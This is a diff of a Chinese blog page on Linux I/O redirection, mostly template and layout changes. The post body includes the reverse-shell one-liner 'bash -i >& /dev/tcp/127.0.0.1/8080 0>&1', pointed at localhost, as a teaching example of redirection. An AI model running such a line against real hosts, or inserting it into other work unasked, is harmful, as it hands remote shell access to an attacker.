@@ -1,25 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <title>Linux I/O重定向</title>
+  <meta name="description" content="Info Linux中重定向是很有趣的一部分，今天就在这进行一下整理。">
 
-  <link rel="stylesheet" href="/stylesheets/post.css">
-  <link rel="stylesheet" href="/stylesheets/default.css">
+  
+  
+  <link rel="stylesheet" href="/stylesheets/main.css">
+  <link rel="stylesheet" href="/stylesheets/fix.css">
+  <link rel="canonical" href="http://p0wd3r.cc/2016/03/02/linux-redirection.html">
+  <link rel="alternate" type="application/rss+xml" title="p0wd3r.cc" href="http://p0wd3r.cc/feed.xml">
+
+  
 </head>
-<body>
-  <div class="container">
-
-    <div class="post-title">
-  <h1>Linux I/O重定向</h1>
-  <p>02 Mar 2016</p>
-</div>
 
 
-    <a href="/"><img src="/images/scribble2.png" alt=""></a>
-    <div class="post-content">
-      <h2 id="info">Info</h2>
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+
+    
+    <a class="site-title" href="http://p0wd3r.cc/">p0wd3r.cc</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15" width="18px" height="15px">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        <a class="page-link" href="/about/">About</a>
+        <a class="page-link" href="/feed/">RSS</a>
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Linux I/O重定向</h1>
+    <p class="post-meta"><time datetime="2016-03-02T00:00:00+08:00" itemprop="datePublished">Mar 2, 2016</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h2 id="info">Info</h2>
 <p>Linux中重定向是很有趣的一部分，今天就在这进行一下整理。</p>
 
 <h3 id="io">标准I/O</h3>
@@ -42,7 +82,7 @@
 
 <h4 id="x00">0x00</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1
 </code></pre>
 </div>
 
@@ -57,28 +97,40 @@
 
 <h4 id="x01">0x01</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="nb">exec </span>9&lt;&gt;/dev/tcp/127.0.0.1/8080
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="nb">exec </span>9&lt;&gt;/dev/tcp/127.0.0.1/8080
 </code></pre>
 </div>
 
 <p>此处打开文件，并利用9作为FD对其进行输入和输出。需要注意的是尽量不要使用大于9的FD进行重定向，有可能跟bash自己拥有的FD冲突。</p>
 
 
+  </div>
+
+  
+    
+
+  
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p>&quot;The quieter you become, the more you are able to hear.&quot;
+</p>
+      </div>
     </div>
 
-    <div id="disqus_thread"></div>
-    <script>
-    (function() { // DON'T EDIT BELOW THIS LINE
-    var d = document, s = d.createElement('script');
-
-    s.src = '//imp0wd3r.disqus.com/embed.js';
-
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-    })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
-
   </div>
-</body>
+
+</footer>
+
+
+  </body>
+
 </html>
